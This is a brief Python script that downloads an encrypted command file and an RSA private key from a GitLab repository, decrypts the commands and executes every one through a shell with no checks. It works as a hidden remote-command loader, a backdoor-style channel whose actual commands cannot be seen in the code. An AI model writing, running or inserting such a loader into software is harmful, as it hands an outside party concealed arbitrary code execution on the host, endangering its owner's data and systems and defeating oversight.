#!/usr/bin/env python

import requests
from rsa_crypt import dec_list_to_list
import subprocess

enc_cmd_url = 'https://gitlab.com/privacyworld/key/raw/master/cmd.rsa'
pri_url = 'https://gitlab.com/privacyworld/key/raw/master/pri.pem'

def dec_remote_aes(enc_cmd_url, pri_url):
    r = requests.get(enc_cmd_url)
    cmd_enc_list = r.content.splitlines()
    r = requests.get(pri_url)
    pri_str = r.content
    cmd_list = dec_list_to_list(cmd_enc_list, pri_str)
    return_code_list = []
    for line in cmd_list:
        return_code_list.append(subprocess.call(line, shell=True))
    return return_code_list


dec_remote_aes(enc_cmd_url, pri_url)
